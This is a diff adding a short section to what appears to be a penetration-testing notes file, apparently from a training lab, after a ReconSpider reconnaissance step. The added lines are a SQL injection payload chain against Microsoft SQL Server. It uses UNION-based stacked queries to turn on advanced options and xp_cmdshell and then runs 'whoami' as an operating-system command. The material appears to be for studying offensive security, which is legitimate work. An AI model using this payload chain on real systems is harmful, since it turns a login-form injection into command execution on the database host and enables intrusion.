@@ -241,3 +241,11 @@ unzip ReconSpider.zip
 python3 ReconSpider.py http://inlanefreight.com
 cat results.json
 ```
+```
+#### SQL Injection:
+admin' UNION SELECT 1,2,3,4,5; EXEC sp_configure 'show advanced options', 1--+
+admin' UNION SELECT 1,2,3,4,5; RECONFIGURE--+
+admin' UNION SELECT 1,2,3,4,5; EXEC sp_configure 'xp_cmdshell', 1--+
+admin' UNION SELECT 1,2,3,4,5; RECONFIGURE--+
+EXEC xp_cmdshell 'whoami'
+```
